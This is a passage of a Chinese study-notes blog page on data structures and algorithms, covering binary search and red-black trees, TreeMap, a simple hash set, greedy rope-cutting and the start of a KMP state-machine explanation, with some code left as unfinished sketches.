<span class="keyword">if</span> (root.<span class="keyword">val</span><span class="operator"> == </span>target)</span><br><span class="line">        <span class="comment">// 找到目标，做点什么</span></span><br><span class="line">    <span class="keyword">if</span> (root.<span class="keyword">val</span> &lt; target) </span><br><span class="line">        <span class="constructor">BST(<span class="params">root</span>.<span class="params">right</span>, <span class="params">target</span>)</span>;</span><br><span class="line">    <span class="keyword">if</span> (root.<span class="keyword">val</span> &gt; target)</span><br><span class="line">        <span class="constructor">BST(<span class="params">root</span>.<span class="params">left</span>, <span class="params">target</span>)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>leet.652 寻找重复子树</p><p><img src="../images/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/640-1621760078724.png" alt="Image"></p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">List&lt;TreeNode&gt; findDuplicateSubtrees(<span class="name">TreeNode</span> root)<span class="comment">;</span></span><br></pre></td></tr></table></figure><p>分析 : </p><p>想知道以自己为根的子树是不是重复的, 是否应该加入结果列表中, 需要知道一下信息</p><ol><li>以我为根的这颗二叉树(子树)样子</li><li>以其他节点为根的子树都长什么样子 </li></ol><p>计算一颗二叉树有多少个节点</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> <span class="keyword">count</span>(TreeNode root)&#123;</span><br><span class="line"><span class="keyword">if</span>(root == <span class="keyword">null</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//先算出右子树有多少节点</span></span><br><span class="line"><span class="keyword">int</span> left = <span class="keyword">count</span>(root.left);</span><br><span class="line"><span class="keyword">int</span> right = <span class="keyword">count</span>(root.right);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="二叉搜索树"><a href="#二叉搜索树" class="headerlink" title="二叉搜索树"></a>二叉搜索树</h3><h4 id="BST"><a href="#BST" class="headerlink" title="BST"></a>BST</h4><p>二叉查找树  ,左节点比父节点值小,  右节点比父节点值大, 高度决定了查找效率</p><p>在理想的情况下，二叉查找树增删查改的时间复杂度为O(logN)（其中N为节点数），最坏的情况下为O(N)。当它的高度为logN+1时，我们就说二叉查找树是平衡的。</p><p><img src="../images/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/af3502319d2a56536b54a02f973a7534112150.png" alt="img"></p><h5 id="BST查找操作"><a href="#BST查找操作" class="headerlink" title="BST查找操作"></a>BST查找操作</h5><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">T <span class="built_in"> key</span> = a search<span class="built_in"> key</span></span><br><span class="line">Node<span class="built_in"> root</span> = point <span class="keyword">to</span> the<span class="built_in"> root</span> <span class="keyword">of</span> a BST</span><br><span class="line"></span><br><span class="line">while<span class="built_in">(true</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span><span class="built_in">(root</span>==null)&#123;</span><br><span class="line">    break;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span><span class="built_in">(root</span>.<span class="keyword">value</span>.equals<span class="built_in">(key</span>))&#123;</span><br><span class="line">    <span class="keyword">return</span><span class="built_in"> root</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span><span class="built_in">(key</span>.compareTo<span class="built_in">(root</span>.<span class="keyword">value</span>)&lt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="built_in">root</span> =<span class="built_in"> root</span>.left;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="built_in">root</span> =<span class="built_in"> root</span>.right;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> null;</span><br></pre></td></tr></table></figure><p>注意: 父结点要和左子树所有所属节点进行比较 , 且所有左子树所属节点小于父节点值</p><p>进行查找时和父节点比较后可以同时排除两个 key&gt;root , key在root.right 找, key&lt;root , 在 roo.left找</p><p>直到当前节点指针为空或者查找到对应的节点，程序查找结束。</p><h5 id="BST-插入"><a href="#BST-插入" class="headerlink" title="BST 插入"></a>BST 插入</h5><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Node</span> <span class="title">node</span> = create a new <span class="keyword">node</span> <span class="title">with</span> specify value</span><br><span class="line"><span class="keyword">Node</span> <span class="title">root</span> = point the root <span class="keyword">node</span> <span class="title">of</span> a BST</span><br><span class="line"><span class="keyword">Node</span> <span class="title">parent</span> = null;</span><br><span class="line"></span><br><span class="line">//find the parent <span class="keyword">node</span> <span class="title">to</span> append the new <span class="keyword">node</span><span class="title"></span></span><br><span class="line"><span class="title">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">   if(<span class="attr">root=</span>=null)break;</span><br><span class="line">   parent = root;</span><br><span class="line">   if(<span class="keyword">node</span>.<span class="title">value</span>.compareTo(root.value)<span class="tag">&lt;=0)&#123;</span></span><br><span class="line"><span class="tag">      root = root.left;  </span></span><br><span class="line"><span class="tag">   &#125;else&#123;</span></span><br><span class="line"><span class="tag">      root = root.right;</span></span><br><span class="line"><span class="tag">   &#125; </span></span><br><span class="line"><span class="tag">&#125;</span></span><br><span class="line"><span class="tag">if(parent!=null)&#123;</span></span><br><span class="line"><span class="tag">   if(node.value.compareTo(parent.value)&lt;=0)&#123;//append to left</span></span><br><span class="line"><span class="tag">      parent.left = node;</span></span><br><span class="line"><span class="tag">   &#125;else&#123;//append to right</span></span><br><span class="line"><span class="tag">  parent.right = node;</span></span><br><span class="line"><span class="tag">   &#125;</span></span><br><span class="line"><span class="tag">&#125;</span></span><br></pre></td></tr></table></figure><p>插入操作先通过循环查找到待插入的节点的父节点，和查找父节点的逻辑一样，都是比大小，小的往左，大的往右。找到父节点后，对比父节点，小的就插入到父节点的左节点，大就插入到父节点的右节点上。</p><h5 id="BST删除"><a href="#BST删除" class="headerlink" title="BST删除"></a>BST删除</h5><ol><li>查找到要删除的节点。</li><li>如果待删除的节点是叶子节点，则直接删除。</li><li>如果待删除的节点不是叶子节点，则先找到待删除节点的中序遍历的后继节点，用该后继节点的值替换待删除的节点的值，然后删除后继节点。</li></ol><p><img src="../images/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/adf35d4ba9207ade1ddd80d0f2ab11b598210.png" alt="img"></p><p>删除叶子节点后需要保证BST树的完整, 所以需要查看节点子节点是否为空 ,不为空要使用子节点替代被删除节点 </p><h5 id="BST存在的问题"><a href="#BST存在的问题" class="headerlink" title="BST存在的问题"></a>BST存在的问题</h5><p><strong>BST存在的主要问题是，数在插入的时候会导致树倾斜，不同的插入顺序会导致树的高度不一样，而树的高度直接的影响了树的查找效率。理想的高度是logN，最坏的情况是所有的节点都在一条斜线上，这样的树的高度为N。</strong></p><h4 id="RBTree"><a href="#RBTree" class="headerlink" title="RBTree"></a>RBTree</h4><p>基于BST存在的问题，一种新的树——平衡二叉查找树(Balanced BST)产生了。平衡树在插入和删除的时候，会通过旋转操作将高度保持在logN。其中两款具有代表性的平衡树分别为AVL树和红黑树。AVL树由于实现比较复杂，而且插入和删除性能差，在实际环境下的应用不如红黑树。</p><p>红黑树（Red-Black Tree，以下简称RBTree）的实际应用非常广泛，比如Linux内核中的完全公平调度器、高精度计时器、ext3文件系统等等，各种语言的函数库如Java的TreeMap和TreeSet，C++ STL的map、multimap、multiset等。</p><p>RBTree也是函数式语言中最常用的持久数据结构之一，在计算几何中也有重要作用。值得一提的是，Java 8中HashMap的实现也因为用RBTree取代链表，性能有所提升</p><h3 id="TreeMap"><a href="#TreeMap" class="headerlink" title="TreeMap"></a>TreeMap</h3><p>还有一种<code>Map</code>，它在内部会对Key进行排序，这种<code>Map</code>就是<code>SortedMap</code>。注意到<code>SortedMap</code>是接口，它的实现类是<code>TreeMap</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">       ┌───┐</span><br><span class="line">       │Map│</span><br><span class="line">       └───┘</span><br><span class="line">         ▲</span><br><span class="line">    ┌────┴─────┐</span><br><span class="line">    │          │</span><br><span class="line">┌───────┐ ┌─────────┐</span><br><span class="line">│HashMap│ │SortedMap│</span><br><span class="line">└───────┘ └─────────┘</span><br><span class="line">               ▲</span><br><span class="line">               │</span><br><span class="line">          ┌─────────┐</span><br><span class="line">          │ TreeMap │</span><br><span class="line">          └─────────┘</span><br></pre></td></tr></table></figure><p><code>SortedMap</code>保证遍历时以Key的顺序来进行排序。例如，放入的Key是<code>&quot;apple&quot;</code>、<code>&quot;pear&quot;</code>、<code>&quot;orange&quot;</code>，遍历的顺序一定是<code>&quot;apple&quot;</code>、<code>&quot;orange&quot;</code>、<code>&quot;pear&quot;</code>，因为<code>String</code>默认按字母排序：</p><p>使用<code>TreeMap</code>时，放入的Key必须实现<code>Comparable</code>接口。<code>String</code>、<code>Integer</code>这些类已经实现了<code>Comparable</code>接口，因此可以直接作为Key使用。作为Value的对象则没有任何要求。</p><p>如果作为Key的class没有实现<code>Comparable</code>接口，那么，必须在创建<code>TreeMap</code>时同时指定一个自定义排序算法：</p><h3 id="红黑树"><a href="#红黑树" class="headerlink" title="红黑树"></a>红黑树</h3><p><a href="https://tech.meituan.com/2016/12/02/redblack-tree.html" target="_blank" rel="noopener">参考</a></p><p>红黑树是平衡二叉查找树的一种 </p><h4 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h4><ol><li>任何一个节点都有颜色 ,黑色或者红色</li><li>根节点是黑色的</li><li>父子节点之间不能出现两个连续的红节点</li><li>任何一个节点向下遍历到其子孙的叶子节点, 所经过的黑节点个数必须相等</li><li>空节点被认为是黑色的</li></ol><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">class <span class="keyword">Node</span><span class="title">&lt;T</span>&gt;&#123;</span><br><span class="line">public T value;</span><br><span class="line">public boolean isRead;</span><br><span class="line">public <span class="keyword">Node</span><span class="title">&lt;T</span>&gt; left;</span><br><span class="line">public <span class="keyword">Node</span><span class="title">&lt;T</span>&gt; right;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>RBTree 在理论上还是一颗BST树, 但是它在对BST 的插入和删除操作会维持树的平衡, 即保证树的高度在[logN, logN +1 ] (理论上, 极端的情况下可以出现RBTree的高度可以达到2*logN ,但实际上很难遇到 ) . 这样RBTree 的查找时间复杂度始终保持在 O(logN) 从而接近于理想的BST, RBTree 的删除和插入的时间复杂度也是O(logN). RBTree 的查找操作就是BST的查找操作 </p><p><img src="../images/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/45dbcbcdfd1a99f1d01b3ae7b013cf7978526.png" alt="img"></p><h4 id="查找操作"><a href="#查找操作" class="headerlink" title="查找操作"></a>查找操作</h4><p>RBTree 的查找操作和 BST 的查找操作是一样的  </p><h4 id="插入操作"><a href="#插入操作" class="headerlink" title="插入操作"></a>插入操作</h4><p>插入与BST插入方式一致. 只不过是插入过后, 可能会导致树的不平衡操作 ,只不过插入后会导致树的不平衡 , 需要对数进行旋转操作和颜色修复,使得它符合RBTree的定义 ,新插入的节点是红色的. 颜色修复操作如果遇到父节点的颜色为黑则修复操作结束 , 也就是说 ,只有子父节点为红色节点的时候需要颜色修复操作</p><p>颜色修复操作分一下三种情况 </p><ol><li>叔叔节点也为红色</li><li>叔叔节点为空, 且祖父节点, 父节点和新节点处于一条xie线上</li><li>叔叔节点为空, 且祖父节点, 父节点和新节点不处于一条斜线上</li></ol><p>插入操作-Case 1</p><p>case 1 的操作是将父节点和叔叔节点与祖父节点的颜色互换, 这样就符合了RBTree 的定义 . 即维持了高度的平衡, 修复后颜色也符合RBTree 定义的第三条和第四条 </p><p>操作完成后A节点变成了新的节点. 如果 A节点的父节点不是黑色的话, 则继续做修复操作 </p><p>插入操作-Casse 2 </p><p>case2 的操作是将B节点进行右旋操作, 并且和父节点A互换颜色 . 通过该修复操作RBTree 的高度和颜色都符和红黑树的定义 . 如果 B和 C节点都是右节点的话, 只要将操作变成左旋就可以了<img src="../images/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/d2004602c4b11c5207eae1ddcc013b2e43177.png" alt="img"></p><p>插入操作-Case 3</p><p>case 3 的操作是将C节点进行左旋, 这样就从Case 3转换成case 2 了,然后针对case 2 进行操作处理就行了. case 2 操作做了一个右旋操作和颜色互换来达到目的. 如果树的结构是下面的镜像结构, 则只需要将对应的左旋变成右旋, 右旋变成左旋即可 </p><p><img src="../images/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/977048855e80f64b4bd72ed77a216dd643825.png" alt="img"></p><h2 id="哈希"><a href="#哈希" class="headerlink" title="哈希"></a>哈希</h2><p>No.705</p><p>不使用任何内建的哈希表库设计一个哈希集合（HashSet）。</p><p>实现 MyHashSet 类：</p><ol><li>void add(key) 向哈希集合中插入值 key 。</li><li>bool contains(key) 返回哈希集合中是否存在这个值 key 。</li><li>void remove(key) 将给定值 key 从哈希集合中删除。如果哈希集合中没有这个值，什么也不做。</li></ol><p>哈希集合实现</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyHashSet</span> </span>&#123;</span><br><span class="line">    <span class="keyword">boolean</span>[] nodes = <span class="keyword">new</span> <span class="keyword">boolean</span>[<span class="number">1000009</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> key)</span> </span>&#123;</span><br><span class="line">        nodes[key] = <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">remove</span><span class="params">(<span class="keyword">int</span> key)</span> </span>&#123;</span><br><span class="line">        nodes[key] = <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">contains</span><span class="params">(<span class="keyword">int</span> key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> nodes[key];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>引申一下哈希函数</p><p>哈希函数是指把一个大范围映射到一个小范围, 把大范围映射到一个小范围的目的往往是为了节省空间，使得数据容易保存。</p><p>\1. Hash的主要原理就是把大范围映射到小范围；所以，你输入的实际值的个数必须和小范围相当或者比它更小。不然冲突就会很多。<br>\2. 由于Hash逼近单向函数；所以，你可以用它来对数据进行加密。<br>\3. 不同的应用对Hash函数有着不同的要求；比如，用于加密的Hash函数主要考虑它和单项函数的差距，而用于查找的Hash函数主要考虑它映射到小范围的冲突率。</p><p>Hash函数应用的主要对象是数组（比如，字符串），而其目标一般是一个int类型。以下我们都按照这种方式来说明。</p><p>一般的说，Hash函数可以划分为如下几类：<br>\1. 加法Hash</p><p>\2. 位运算Hash</p><p>\3. 乘法Hash</p><p>\4. 除法Hash</p><p>\5. 查表Hash</p><p>\6. 混合Hash</p><p>7.数组Hash</p><h2 id="贪心算法"><a href="#贪心算法" class="headerlink" title="贪心算法"></a>贪心算法</h2><p> 所谓贪心算法是指，在对问题求解时，总是做出在当前看来是最好的选择。也就是说，不从整体最优上加以考虑，他所做出的仅是在某种意义上的局部最优解。</p><p>   贪心算法没有固定的算法框架，算法设计的关键是贪心策略的选择。必须注意的是，贪心算法不是对所有问题都能得到整体最优解，选择的贪心策略必须具备无后效性，即某个状态以后的过程不会影响以前的状态，只与当前状态有关。</p><p>  <strong>所以对所采用的贪心策略一定要仔细分析其是否满足无后效性。</strong></p><p>思路</p><p>1.建立数学模型来描述问题。</p><p>  2.把求解的问题分成若干个子问题。</p><p>  3.对每一子问题求解，得到子问题的局部最优解。</p><p>  4.把子问题的解局部最优解合成原来解问题的一个解。</p><p>贪心算法适用情况很少 </p><p>从问题的某一初始解出发；</p><p>  while （能朝给定总目标前进一步）</p><p>  { </p><p>​     利用可行的决策，求出可行解的一个解元素；</p><p>  }</p><p>  由所有解元素组合成问题的一个可行解；</p><h3 id="OfferNo14-剪绳子问题"><a href="#OfferNo14-剪绳子问题" class="headerlink" title="OfferNo14   剪绳子问题"></a>OfferNo14   剪绳子问题</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">adjectime</span><span class="params">(<span class="keyword">int</span> length)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(length&lt;<span class="number">2</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(length&lt;<span class="number">4</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span>  length-<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// n&gt;=5 时. 多剪长度为 3 的绳子 , 剩下的绳子长度为4时, 把僧子剪成两段长度为2的绳子</span></span><br><span class="line">        <span class="keyword">int</span> timesOf3 = length / <span class="number">3</span> ;</span><br><span class="line">        <span class="keyword">if</span> (length%<span class="number">3</span> == <span class="number">1</span> )&#123;</span><br><span class="line">            --timesOf3;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> timeof2 = (length - timesOf3 * <span class="number">3</span> ) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">int</span>) (Math.pow(<span class="number">3</span>,timesOf3)*Math.pow(<span class="number">2</span>,timeof2));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="动态规划"><a href="#动态规划" class="headerlink" title="动态规划"></a>动态规划</h2><h3 id="KMP字符匹配算法"><a href="#KMP字符匹配算法" class="headerlink" title="KMP字符匹配算法"></a>KMP字符匹配算法</h3><p>Knuth-Morris-Pratt 算法,  是一个著名的字符串匹配算法 ,效率很高</p><p>KMP <strong>永不回退 <code>txt</code> 的指针 <code>i</code>，不走回头路（不会重复扫描 <code>txt</code>），</strong> 借助 dp 数组中存储的信息 把 pat 移到正确的位置和 txt 匹配 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span>  <span class="class"><span class="keyword">class</span> <span class="title">KMP</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> [][]dp;</span><br><span class="line"><span class="keyword">private</span> String pat;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">KMP</span><span class="params">(String pat)</span></span>&#123;</span><br><span class="line"><span class="keyword">this</span>.pat = pat;</span><br><span class="line"><span class="comment">//通过pat 构建dp数组</span></span><br><span class="line"><span class="comment">//需要O(M)时间</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">search</span><span class="params">(String txt)</span></span>&#123;</span><br><span class="line"><span class="comment">//借助dp数组去匹配 txt </span></span><br><span class="line"><span class="comment">//需要 O(N)时间 </span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 当我们需要用同一 pat 去匹配不同 txt 时, 就不需要浪费时间 构造 dp数组了 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">KMP kmp = <span class="keyword">new</span> KMP(<span class="string">"aaab"</span>);</span><br><span class="line"><span class="keyword">int</span> pos1 = kmp.search(<span class="string">"aaacaaaab"</span>);</span><br><span class="line"><span class="keyword">int</span> pos2 = kmp.search(<span class="string">"aaaaaaaab"</span>);</span><br></pre></td></tr></table></figure><h4 id="状态机概述"><a href="#状态机概述" class="headerlink" title="状态机概述"></a>状态机概述</h4><p>为什么说 KMP 算法和状态机有关呢？是这样的，我们可以认为 <code>pat</code> 的匹配就是状态的转移。比如当 pat = “ABABC”：</p><p><img src="../images/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/state.jpg" alt="img"></p><p>如上图，圆圈内的数字就是状态，状态 0 是起始状态，状态 5（<code>pat.length</code>）是终止状态。开始匹配时 <code>pat</code> 处于起始状态，一旦转移到终止状态，就说明在 <code>txt</code> 中找到了 <code>pat</code>。比如说当前处于状态 2，就说明字符 “AB” 被匹配：</p><p><img src="../images/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/state2.jpg" alt="img"></p><p>另外，处于不同状态时，<code>pat</code> 状态转移的行为也不同。比如说假设现在匹配到了状态 4，如果遇到字符 A 就应该转移到状态 3，遇到字符 C 就应该转移到状态 5，如果遇到字符 B 就应该转移到状态 0：</p><p><a href="https://github.com/labuladong/fucking-algorithm/blob/master/pictures/kmp/state4.jpg" target="_blank" rel="noopener"><img src="../images/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/state4.jpg" alt="img"></a></p><p>具体什么意思呢，我们来一个个举例看看。用变量 <code>j</code> 表示指向当前状态的指针，当前 <code>pat</code> 匹配到了状态 4：</p><p><a href="https://github.com/labuladong/fucking-algorithm/blob/master/pictures/kmp/exp1.jpg" target="_blank" rel="noopener"><img src="../images/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/exp1.jpg" alt="img"></a></p><p>如果遇到了字符 “A”，根据箭头指示，转移到状态 3 是最聪明的：</p><p><a href="https://github.com/labuladong/fucking-algorithm/blob/master/pictures/kmp/exp3.jpg" target="_blank" rel="noopener"><img src="../images/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/exp3.jpg" alt="img"></a></p><p>如果遇到了字符 “B”，根据箭头指示，只能转移到状态 0（一夜回到解放前）：</p><p><a href="https://github.com/labuladong/fucking-algorithm/blob/master/pictures/kmp/exp5.jpg" target="_blank" rel="noopener"><img src="../images/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/exp5.jpg" alt="img"></a></p><p>如果遇到了字符 “C”，根据箭头指示，应该转移到终止状态 5，这也就意味着匹配完成：</p><p><a href="https://github.com/labuladong/fucking-algorithm/blob/master/pictures/kmp/exp7.jpg" target="_blank" rel="noopener"><img src="../images/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/exp7.jpg" alt="img"></a></p><p>当然了，还可能遇到其他字符，比如 Z，但是显然应该转移到起始状态 0，因为 <code>pat</code> 中根本都没有字符 Z：</p><p><a href="https://github.com/labuladong/fucking-algorithm/blob/master/pictures/kmp/z.jpg" target="_blank" rel="noopener"><img src="../images/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/z.jpg" alt="img"></a></p><p>这里为了清晰起见，我们画状态图时就把其他字符转移到状态 0 的箭头省略，只画 <code>pat</code> 中出现的字符的状态转移：</p><p><a href="https://github.com/labuladong/fucking-algorithm/blob/master/pictures/kmp/allstate.jpg" target="_blank" rel="noopener"><img src="../images/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/allstate.jpg" alt="img"></a></p><p>KMP 算法最关键的步骤就是构造这个状态转移图。<strong>要确定状态转移的行为，得明确两个变量，一个是当前的匹配状态，另一个是遇到的字符</strong>；确定了这两个变量后，就可以知道这个情况下应该转移到哪个状态。</p><p>下面看一下 KMP 算法根据这幅状态转移图匹配字符串 <code>txt</code> 的过程：</p><p><a href="https://github.com/labuladong/fucking-algorithm/blob/master/pictures/kmp/kmp.gif" target="_blank" rel="noopener"><img src="../images/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/kmp.gif" alt="img"></a></p><p><strong>请记住这个 GIF 的匹配过程，这就是 KMP 算法的核心逻辑</strong>！</p><p>为了描述状态转移图, 定义一个二维dp数组, 含义如下:</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">dp[j][c] = next </span><br><span class="line"><span class="number">0</span> &lt;= j &lt; M 代表当前状态 </span><br><span class="line"><span class="number">0</span> &lt;= c &lt; <span class="number">256</span> 代表遇到的字符(ASCII码)</span><br><span class="line"><span class="number">0</span> &lt;= next &lt;= M , 代表下一个状态 </span><br><span class="line"></span><br><span class="line">dp[<span class="number">4</span>][<span class="string">'A'</span>] = <span class="number">3</span> 表示 :</span><br><span class="line">当前是状态 <span class="number">4</span> , 如果遇到字符 A  pat 应该转移到状态<span class="number">3</span> </span><br><span class="line"></span><br><span class="line">dp[<span class="number">1</span>][<span class="string">'B'</span>] = <span class="number">2</span> 表示 :</span><br><span class="line">当前状态是<span class="number">1</span> , 如果遇到字符 B, pat 应该转移到状态 <span class="number">2</span></span><br></pre></td></tr></table></figure><p>根据dp数组定义和状态转移过程  可以写出KMP算法的search 函数代码:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">search</span><span class="params">(String txt)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> M = pat.length();</span><br><span class="line"><span class="keyword">int</span> N = txt.length();</span><br><span class="line"><span class="comment">//pat的初始态 为 0 </span></span><br><span class="line"><span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; i++)&#123;</span><br><span class="line"><span class="comment">// 当前是状态 j, 遇到字符 txt[i] , </span></span><br><span class="line"><span class="comment">// pat 应该转移到那个状态 </span></span><br><span class="line">j=dp[j][txt.charAt(i)];</span><br><span class="line"><span class="comment">//如果达到终止态, 返回匹配开头的索引</span></span><br><span class="line"><span class="keyword">if</span>(j==M)<span class="keyword">return</span> i - M + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//没达到终止态, 匹配失败 </span></span><br><span class="line"> <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="构建状态转移图"><a href="#构建状态转移图" class="headerlink" title="构建状态转移图"></a>构建状态转移图</h4><p>确定状态的行为, 必须明确两个变量, 一是当前的匹配状态, 另一个是遇到的字符, 而且我们已经根据这个逻辑确定了dp数组的含义, 那么构造dp 数组的框架为:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">for</span> <span class="number">0</span><span class="string">&lt;=j&lt;M:</span> <span class="comment">#状态 </span></span><br><span 